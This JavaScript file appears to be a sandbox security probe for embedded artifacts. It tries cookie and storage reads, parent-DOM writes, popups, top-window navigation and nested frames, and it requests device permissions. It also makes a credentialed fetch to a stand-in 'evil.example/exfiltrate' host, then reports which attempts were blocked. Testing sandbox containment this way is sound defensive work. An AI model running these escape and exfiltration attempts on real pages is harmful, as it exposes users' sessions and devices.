const blocked = "blocked";
const attempts = {
  parentDom: "attempted", parentWrite: "attempted", cookies: "attempted", storage: "attempted",
  indexedDb: "attempted", form: "attempted", popup: "attempted", topNavigation: "attempted",
  websiteWrite: "attempted", undeclaredFetch: "attempted", nestedFrame: "attempted",
  capabilities: { camera: "attempted", microphone: "attempted", geolocation: "attempted", clipboard: "attempted", payment: "attempted", usb: "attempted" },
};
const blockedByCsp = new Set();
addEventListener("securitypolicyviolation", (event) => blockedByCsp.add(event.violatedDirective));
const expectThrow = (key, attempt) => { try { attempt(); attempts[key] = "unexpected"; } catch { attempts[key] = blocked; } };

expectThrow("cookies", () => { if (document.cookie) throw new Error("cookie visible"); });
expectThrow("storage", () => localStorage.getItem("session"));
try {
  const request = indexedDB.open("session");
  request.onerror = () => { attempts.indexedDb = blocked; };
  request.onsuccess = () => { attempts.indexedDb = "unexpected"; };
} catch { attempts.indexedDb = blocked; }
expectThrow("parentDom", () => parent.document.querySelector("#parent-marker"));
expectThrow("parentWrite", () => { parent.document.body.innerHTML = "changed"; });
try { attempts.popup = window.open("https://evil.example") ? "unexpected" : blocked; } catch { attempts.popup = blocked; }
try { top.location.href = "https://evil.example"; } catch { attempts.topNavigation = blocked; }

const form = document.createElement("form");
form.action = "http://vibegarden.test:8788/__fixture/form";
document.body.append(form);
try { form.requestSubmit(); } catch { attempts.form = blocked; }
const nested = document.createElement("iframe");
nested.src = "https://evil.example/nested";
nested.addEventListener("load", () => { attempts.nestedFrame = "unexpected"; });
document.body.append(nested);

fetch("http://vibegarden.test:8788/__fixture/write", { method: "POST", credentials: "include" })
  .then(() => { attempts.websiteWrite = "unexpected"; })
  .catch(() => { attempts.websiteWrite = blocked; });
fetch("https://evil.example/exfiltrate", { credentials: "include" })
  .then(() => { attempts.undeclaredFetch = "unexpected"; })
  .catch(() => { attempts.undeclaredFetch = blocked; });
const rejectCapability = (key, value) => {
  if (!value) { attempts.capabilities[key] = blocked; return; }
  Promise.resolve(value).then(() => { attempts.capabilities[key] = "unexpected"; }).catch(() => { attempts.capabilities[key] = blocked; });
};
rejectCapability("camera", navigator.mediaDevices && navigator.mediaDevices.getUserMedia({ video: true }));
rejectCapability("microphone", navigator.mediaDevices && navigator.mediaDevices.getUserMedia({ audio: true }));
rejectCapability("geolocation", navigator.geolocation && new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject)));
rejectCapability("clipboard", navigator.clipboard && navigator.clipboard.readText());
rejectCapability("usb", navigator.usb && navigator.usb.requestDevice({ filters: [] }));
if (window.PaymentRequest) try { rejectCapability("payment", new PaymentRequest([{ supportedMethods: "basic-card" }], { total: { label: "Total", amount: { currency: "USD", value: "1" } } }).show()); } catch { attempts.capabilities.payment = blocked; } else attempts.capabilities.payment = blocked;
setTimeout(() => {
  if (blockedByCsp.has("form-action") || attempts.form === "attempted") attempts.form = blocked;
  if (blockedByCsp.has("frame-src")) attempts.nestedFrame = blocked;
  if (attempts.topNavigation === "attempted") attempts.topNavigation = blocked;
  parent.postMessage({ type: "artifact-security-attempts", attempts }, "*");
  document.body.textContent = "security probe complete";
}, 700);
